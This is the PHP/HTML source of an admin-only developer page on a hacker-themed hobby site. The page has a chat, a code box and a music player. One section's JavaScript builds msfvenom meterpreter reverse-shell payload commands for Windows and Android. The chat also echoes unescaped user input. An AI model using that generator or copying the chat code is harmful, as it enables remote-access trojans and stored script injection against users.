<?php 
 require 'config.php';
$time = date("F j, Y, g:i a");
if (isset($_SESSION['logged_user'])) {
  if ($_SESSION['logged_user']->root == '1') {
  ?>

<!DOCTYPE html>
<html>
<head>
	<title>paranoid-# studio -h</title>
  <meta charset="utf-8">
	<link rel="stylesheet" type="text/css" href="style.css">
	<link rel="stylesheet" type="text/css" href="css/bootstrap.css">
	<script type="text/javascript" scr="js/bootstrap.js" ></script>
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
  <link rel="stylesheet" type="text/css" href="cover.css">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <!-- <script type="text/javascript" src="main.js"></script> -->
  <script type="text/javascript" src="dev.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
  <script type="text/javascript" src="js/typed.min.js"></script>
  <script defer src="https://use.fontawesome.com/releases/v5.0.9/js/all.js" integrity="sha384-8iPTk2s/jMVj81dnzb/iFR2sdA7u06vHJyyLlAd4snFpCl/SnyUjRrbdJsw1pGIl" crossorigin="anonymous"></script>

</head>
<body onload="header_scroll()">
<style type="text/css">

 .masthead-nav > .active > a {
  border-bottom-color: black;
  color: #B3BFBF;
 }
 .masthead-nav > .second > a {
  border-bottom: 2px solid white;
  color: white;
 }
 .masthead-nav > .second > a:hover {
  border-bottom-color: white;
 }
 .comments {
  background: url(https://i2.wp.com/www.gamerfocus.co/wp-content/uploads/2016/08/dedsec.gif?resize=740%2C416);
 }
</style>
<script type="text/javascript">
$(document).ready(function(){

    $("#top_link").on("click","a", function (event) {

        //отменяем стандартную обработку нажатия по ссылке

        //забираем идентификатор бока с атрибута href
        var id  = $(this).attr('href'),
        //узнаем высоту от начала страницы до блока на который ссылается якорь
            top = $(id).offset().top;         
        //анимируем переход на расстояние - top за 1500 мс
        $('body,html').animate({scrollTop: top}, 1000);
    });
});

$(document).ready(function(){

    $("#text_area").on("click","a", function (event) {

        //отменяем стандартную обработку нажатия по ссылке

        //забираем идентификатор бока с атрибута href
        var id  = $(this).attr('href'),
        //узнаем высоту от начала страницы до блока на который ссылается якорь
            top = $(id).offset().top -  500;         
        //анимируем переход на расстояние - top за 1500 мс
        $('body,html').animate({scrollTop: top}, 1000);
    });
});
</script>

<div class="wrap_top_link">
<div class="top_link" id="top_link"><a href="#content"><i class="fas fa-arrow-up"></i></a></div>
</div>

<!--ХЭДЭР!-->

    <div class="site-wrapper" id="content">

      <div class="site-wrapper-inner">
<div id="header">

        <div class="cover-container">

          <div class="masthead clearfix">
            <div class="inner">
              <h3 class="masthead-brand">Paranoid</h3>
              <nav>
                             <!--ПАНЕЛЬ ПОЛЬЗОВАТЕЛЯ-->
                        <?php
                        if (isset($_SESSION['logged_user'])) {
                          ?>
                 <div class="account">
                    <div class="account_button">  Аккаунт <i class="fas fa-angle-down"></i></div> 
                     <div class="panel_in_account">
                       <h1></h1>

                          <?php echo "Ваш аккаунт: ";echo $_SESSION['logged_user']->login;?>
                            <br>
                         <a href="logout.php">Выход из аккаунта</a>        
                     </div>
                 </div>
                       <?php
                        }
                        ?>              
                <ul class="nav masthead-nav">
                  <li class="active"><a href="/">Home</a></li>
                  <li class="second"><a href="dev.php">For developers</a></li>
                


                </ul>
              </nav>
            </div>
          </div>

          </div>
</div>



<!--КОНТЕНТ!-->
<div class="paralax"></div>
<div class="main-content">
<!--Место под хэдэром.
  <div class="invisible">
  </div>
-->

      <div class="wrap">


               <div class="content_in_dev">
        <img src="images/me.png" style="width: 20%; margin-top: 75px; margin-bottom: 35px;">
        <h1>Раздел для разработчиков.</h1>
        <h1 id="test"></h1>
              </div>


      <script type="text/javascript">

      </script>
         <div class="code_editor">
         <h1>РЕДАКТОР КОДА</h1> 
           <div class="dev_description" id="dev_description">
             <span>Здесь вы можете писать свой код. Редактор поддерживает следующие технологи:</span>
             <span class="dev_description_things" >HTML</span>
             <span class="dev_description_things">CSS</span>
             <span class="dev_description_things">JS</span>
             <span class="dev_description_things">PYTHON</span>
             
           </div>
           





          <div id="text_area">
            <textarea name="textarea" width='100%' tabindex="2" accesskey="c" id="name" onkeyup="c"></textarea>
            <a href="#form" id="link_textarea"><button name="do" id="do_smth" class="button">Передать код в чат</button></a>
          </div>
</div>
<script type="text/javascript">
$(document).ready(function() {

$('button#do_smth').on('click', function() {
      var textarea         =        $('textarea').val();
      $('input#input').val(textarea);

    });
 });


</script>





<style type="text/css">
  form {
    display: flex;
    justify-content: space-around;
    flex-direction: column;
    align-items: center;
  }
  .chat {
    display: flex;
    flex-direction: column;
    align-items: center;
    color: black;
  }
  .chat_form {
    width: 100%;
    background-color: black;
    border: 1px solid green;
    border-radius: 20px;
   color: white;
  }
  .msg {
    width: 90%;
    height: 70px;
  }
</style>    




<?php 
$data_chat = $_GET;
$name_chat = $data_chat['name_chat'];
$text_chat = $data_chat['text_chat'];
$time = date("F j, Y, g:i a");
$errors_chat_2 = array();
if (R::count('chat', "text = ?", array($data_chat['text_chat'])) > 0 ) {
  $errors_chat_1 = 'Такой Комментарий уже был. Не надо.';
}
if(trim($data_chat['text_chat']) == '') {
  $errors_chat_2[] = 'Введите комментарий, пожалуйста.';
}

  if (empty($errors_chat_1)) {
    if (empty($errors_chat_2)) {

  $chat = R::dispense('chat');
  $chat->name = $name_chat;
  $chat->text = $text_chat;
  $chat->date = $time;
  $chat->photo = $_GET['f'];
  R::store($chat);
    }  
} 

$user_d = R::find('chat', 'id > ?', array(1));
?>
<div class="comments" id="comments">
  <h1 style="background: black; border-top: 2px solid white;">ЧАТ ДЛЯ ЮЗЕРОВ</h1>

  <div class="comments_visible">
      <?php 
      if (R::count('chat', "id > 0") == 0) {
 ?>
 <div style="margin: 50px;">Сообщений,пока что, нет.</div>
 <?php
} 

      foreach ($user_d as $user) {
        ?>
    <div class="comment">

      <div class="name_user"><span><span style="color: black;">Пользователь:</span> <?php echo $user->name; ?></span></div>
      <div class="text_user"><span><?php echo $user->text;?></span></div>
    </div> 
        <?php 
      }
      ?>

  

  </div>
  <div class="new_comment">
    <h1>ОСТАВЬТЕ СВОЕ СООБЩЕНИЕ</h1>

      <?php 
      if (isset($_SESSION['logged_user'])) {
      ?>
      <form class="comments_form" method="GET" action="dev.php#form" id="form" enctype="multipart/form-data">

      <input type="text" name="name_chat" placeholder="Ваше имя.." class="input_com"value="<?php echo $_SESSION['logged_user']->login; ?>" readonly >
      <input type="text" name="text_chat" placeholder="Комментарий.." class="input_com" id="input">
        <span style="color: red"><?php echo array_shift($errors_chat_2)?></span>

     <input type="file" name="f" accept="image/jpeg, image/png" class="upload">
      <button type="submit" name="do_chat" class="button">Отправить</button>
    </form>


      <?php
      } else {
        ?>
        <div id="h1">
        <h1 style="font-size: 20px; margin: 15px;">Для того, чтобы оставить комментарий, пожалуйста, <a href="#form">зарегистрируйтесь</a></h1>
        </div>
        <?php
}
      ?>

  </div>
</div>



<div class="metasploit">
  <h1>Сборка экплойтов</h1>
  <span class="dev_metasploit">Здесь вы можете собрать команду для сборки экплойтов.</span>
    <div class="metasploit_form">
    <div>
    <p>Выберите ОС</p>
    <select>
      <option name="android">Android</option>
      <option name="windows">Windows</option>
    </select>
    </div>
    <div>
    <p>Введите свой ip</p>
    <input type="text" placeholder="example: 192.168.1.1" id="input_host">
    </div>
    <div>
    <p>Введите название файла</p>
    <input type="text" id="name_of_exploit">
    </div>
    <button class="button" style="margin: 0 auto;" id="do_exploit">Сгенерировать</button>
    <div class="gen"><span id="exploit"></span></div>
   </div>
</div>


<script type="text/javascript">
  $(document).ready(function() {

    $('button#do_exploit').on('click', function() {
    var host = $('#input_host').val();
    var os = $('select').val();
    var name = $('#name_of_exploit').val();
    if(host == '') {
      var error = true;
    } else {
      var error = false;
    }
    if (name == '') {
      name = 'exploit';
    }
    if (error == false) {
    if (os == 'Windows') {
       $('span#exploit').html("./msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=" + host + " LPORT=4444 -f exe R > /../../storage/emulated/legacy/"+ name +".exe");
    }
    if (os == 'Android') {
      $('span#exploit').html("./msfvenom -p android/meterpreter/reverse_tcp LHOST= " + host +" LPORT=4444 -o /../../storage/emulated/legacy/" + name +".apk");
    }
    } else {
      $('span#exploit').html('Вы не ввели хост -_-')
    }
    });

    
  });

</script>

<div class="music">
  <h1>Music.</h1> 
  <div>
  <audio controls>
 <source src="/audio/1.mp3">

 <p>Ваш браузер не поддерживает аудио</p>
 </audio>
 </div>
</div>




<div class="wrap_1">
  <div class="card">

    <div class="front">
      <img src="https://imageog.flaticon.com/icons/png/512/25/25231.png?size=1200x630f&pad=10,10,10,10&ext=png&bg=FFFFFFFF" width="30%">
      <h1 style="color: black;" class="check_git">ЧЕКНИ GITHUB</h1>


    </div>
    <div class="back"><h1 style="color: white;"><a href="https://www.github.com/ParanoidStudi0/site">https://www.github.com/ParanoidStudi0/site</a></h1></div>

  </div>
</div> 



 <div class="effect">
  <div class="col1"></div>
  <div class="col2"></div>
  <div class="col3"></div>
  <div class="col4"></div>
  <div class="col5"></div>
  <div class="col6"></div>
  <div class="col7"></div>
  <div class="col8"></div>
  <div class="col9"></div>
  <div class="col10"></div>

</div>
 
 <script type="text/javascript">
  $(document).ready(function() {
    function yo() {
   var col1 = parseInt(Math.random() * 500);
   var col2 = parseInt(Math.random() * 500);
   var col3 = parseInt(Math.random() * 500);
   var col4 = parseInt(Math.random() * 500);
   var col5 = parseInt(Math.random() * 500);
   var col6 = parseInt(Math.random() * 500);
   var col7 = parseInt(Math.random() * 500);
   var col8 = parseInt(Math.random() * 500);
   var col9 = parseInt(Math.random() * 500);
   var col10 = parseInt(Math.random() * 500);

    $('div.col1').css({'height': col1 });
    $('div.col2').css({'height': col2 });
    $('div.col3').css({'height': col3 });
    $('div.col4').css({'height': col4 });
    $('div.col5').css({'height': col5 });
    $('div.col6').css({'height': col6 });
    $('div.col7').css({'height': col7 });
    $('div.col8').css({'height': col8 });
    $('div.col9').css({'height': col9 });
    $('div.col10').css({'height': col10 });

    }

     setInterval(yo, 100);


    });
  

</script>

<div class="footer">
Me in: <br>
<a href="https://vk.com/nfs2025"><i class="fab fa-vk"></i> Вконтакте</a>
</div>
<!--Окончание главное дива контента-->

<!--Окончание всех дивов в боди-->
        </div>
      </div>





<script type="text/javascript" src="js/typed.js" ></script>
</body>
</html>









<!--ДОПОЛНИТЕЛЬНО-->
  <?php
} else {
  require 'error.php';
}

} else {
  require 'error.php';
}
?>